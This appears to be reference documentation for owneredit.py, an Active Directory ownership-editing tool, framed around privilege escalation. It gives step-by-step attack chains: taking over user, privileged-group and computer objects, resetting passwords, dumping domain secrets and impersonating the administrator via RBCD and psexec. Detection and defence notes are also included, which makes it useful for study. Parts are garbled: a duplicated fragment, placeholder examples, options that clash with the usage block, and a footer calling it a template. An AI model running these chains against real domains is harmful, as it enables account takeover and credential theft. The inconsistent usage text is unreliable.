# owneredit.py

## Overview
`owneredit.py` reads and modifies the Owner attribute (OwnerSid) of Active Directory objects. This tool is essential for privilege escalation attacks by changing object ownership to gain control over critical AD objects.

## Detailed Description
This script manipulates the ownership of Active Directory objects by modifying the OwnerSid field in the object's security descriptor. When an attacker gains ownership of an AD object, they obtain implicit permissions to modify the object's DACL (Discretionary Access Control List), effectively granting themselves full control. This technique is particularly powerful against high-value targets like user accounts, groups, or computer objects, and can be used to establish persistence or escalate privileges within the domain.

### Key Features:
- **Object Ownership Modification**: Change the owner of any AD object
- **Multiple Target Specification**: Support for sAMAccountName, SID, or Distinguished Name
- **Owner Specification**: Set new owner by sAMAccountName, SID, or DN
- **Security Descriptor Access**: Direct manipulation of nTSecurityDescriptor attribute
- **LDAP/LDAPS Support**: Flexible connection options
- **Well-Known SID Support**: Extensive database of Windows well-known SIDs

### Technical Details:
- Uses LDAP protocol for Active Directory communication
- Manipulates nTSecurityDescriptor attribute directly
- Leverages ldap3 and ldapdomaindump libraries
- Supports both LDAP (389) and LDAPS (636) connections
- Implements security descriptor control for precise modifications
- Compatible with all Windows Active Directory versions

## Command Line Options

```
usage: owneredit.py [-h] [-use-ldaps] [-ts] [-debug] [-action {read,write}]
                    [-new-owner NAME] [-new-owner-sid SID] [-new-owner-dn DN]
                    [-target NAME] [-target-sid SID] [-target-dn DN]
                    identity

Required Arguments:
  identity              domain.local/username[:password]

Optional Arguments:
  -use-ldaps            Use LDAPS instead of LDAP
  -ts                   Add timestamp to every logging output
  -debug                Turn DEBUG output ON
  -action               Action to operate (read or write, default: read)

New Owner (choose one):
  -new-owner            sAMAccountName of new owner
  -new-owner-sid        Security Identifier of new owner
  -new-owner-dn         Distinguished Name of new owner

Target Object (choose one):
  -target               sAMAccountName of target object
  -target-sid           Security Identifier of target object
  -target-dn            Distinguished Name of target object

Authentication & Connection:
  -hashes               NTLM hashes (LM:NT)
  -no-pass              Don't ask for password
  -k                    Use Kerberos authentication
  -aesKey               AES key for Kerberos authentication
  -dc-ip                Domain controller IP address
```

## Usage Examples

### Reading Object Ownership
```bash
# Read ownership of user account
python3 owneredit.py domain.com/user:password -action read -target victim_user

# Read ownership using SID
python3 owneredit.py domain.com/user:password -action read -target-sid S-1-5-21-domain-1001

# Read ownership using Distinguished Name
python3 owneredit.py domain.com/user:password -action read -target-dn "CN=VictimUser,CN=Users,DC=domain,DC=com"
```

### Modifying Object Ownership
```bash
# Change ownership of user account
python3 owneredit.py domain.com/attacker:password -action write -target victim_user -new-owner attacker

# Take ownership using SID
python3 owneredit.py domain.com/user:password -action write -target-sid S-1-5-21-domain-1001 -new-owner-sid S-1-5-21-domain-1000

# Take ownership of computer object
python3 owneredit.py domain.com/user:password -action write -target "VICTIM-PC$" -new-owner compromised_user
```

### Advanced Usage
```bash
# Use LDAPS for encrypted connection
python3 owneredit.py domain.com/user:password -use-ldaps -action write -target victim_user -new-owner attacker

# Take ownership of privileged group
python3 owneredit.py domain.com/user:password -action write -target "Domain Admins" -new-owner attacker

# Use hash authentication
python3 owneredit.py domain.com/user -hashes :ntlmhash -action write -target victim_user -new-owner attacker
```

# Using hash authentication
python3 owneredit.py -hashes :ntlmhash domain.com/user@target.domain.com
```

### Advanced Usage
```bash
# Advanced example 1
python3 owneredit.py [advanced_parameters]

# Advanced example 2
python3 owneredit.py [advanced_parameters_2]

# Debug mode
python3 owneredit.py DOMAIN/user:password@target -file "C:\\file.txt" -owner "DOMAIN\\newowner" -debug
```

## Attack Chain Integration

### Privilege Escalation via Object Ownership
```bash
# Step 1: Identify targets with GenericWrite or WriteOwner permissions
python3 dacledit.py domain.com/user:password -action read -target victim_user

# Step 2: Take ownership of the target object
python3 owneredit.py domain.com/user:password -action write -target victim_user -new-owner attacker

# Step 3: Modify DACL to grant full control
python3 dacledit.py domain.com/attacker:password -action write -target victim_user -principal attacker -rights FullControl

# Step 4: Reset password or modify group membership
net user victim_user NewPassword123 /domain
```

### Group Takeover Chain
```bash
# Step 1: Take ownership of privileged group
python3 owneredit.py domain.com/user:password -action write -target "Backup Operators" -new-owner attacker

# Step 2: Grant yourself permissions to modify group membership
python3 dacledit.py domain.com/attacker:password -action write -target "Backup Operators" -principal attacker -rights GenericAll

# Step 3: Add yourself to the group
net group "Backup Operators" attacker /add /domain

# Step 4: Use group privileges for further attacks
python3 secretsdump.py domain.com/attacker:password@dc.domain.com -use-vss
```

### Computer Object Takeover
```bash
# Step 1: Take ownership of computer object
python3 owneredit.py domain.com/user:password -action write -target "VICTIM-PC$" -new-owner attacker

# Step 2: Configure RBCD on the computer
python3 rbcd.py domain.com/attacker:password -action write -delegate-from ATTACKER-PC$ -delegate-to "VICTIM-PC$"

# Step 3: Request service ticket and impersonate admin
python3 getST.py domain.com/ATTACKER-PC$:password -spn cifs/VICTIM-PC$ -impersonate administrator

# Step 4: Access the system
export KRB5CCNAME=administrator.ccache
python3 psexec.py -k -no-pass VICTIM-PC$
```

## Prerequisites
- Valid domain credentials with appropriate permissions
- Network access to domain controller (LDAP/LDAPS)
- WriteOwner or GenericAll permissions on target object
- Knowledge of target object identifiers (sAMAccountName, SID, or DN)

## Detection Considerations
- **Event ID 5136**: Directory service object was modified (ownership change)
- **Event ID 4662**: Operation was performed on an object (security descriptor access)
- **LDAP Queries**: Unusual LDAP searches for security descriptors
- **Ownership Changes**: Monitoring changes to object ownership
- **Privilege Escalation Patterns**: Rapid ownership change followed by permission modifications

## Defensive Measures
- **Audit Object Access**: Enable detailed auditing of security descriptor modifications
- **Privileged Object Protection**: Implement AdminSDHolder for critical objects
- **Permission Monitoring**: Regular audits of object ownership and permissions
- **Access Control**: Restrict WriteOwner permissions to necessary accounts only
- **LDAP Signing**: Enable LDAP signing and channel binding
- **Anomaly Detection**: Monitor for unusual ownership change patterns

## Common Attack Targets
- **High-Value User Accounts**: Domain administrators, service accounts
- **Privileged Groups**: Domain Admins, Enterprise Admins, Backup Operators
- **Computer Objects**: Domain controllers, critical servers
- **Service Principal Names**: High-privilege service accounts
- **Group Policy Objects**: For domain-wide persistence

## Related Tools
- [dacledit.py](dacledit.md) - Often used together to modify permissions after ownership change
- [addcomputer.py](addcomputer.md) - Create computer accounts for ownership transfer
- [rbcd.py](rbcd.md) - Configure delegation after computer object takeover
- [GetADUsers.py](GetADUsers.md) - Enumerate potential targets
- [GetADComputers.py](GetADComputers.md) - Find computer objects to target
- [findDelegation.py](findDelegation.md) - Discover delegation relationships for exploitation

---

*Note: This documentation is a template. Please refer to the actual tool's help output and source code for complete and accurate information.*
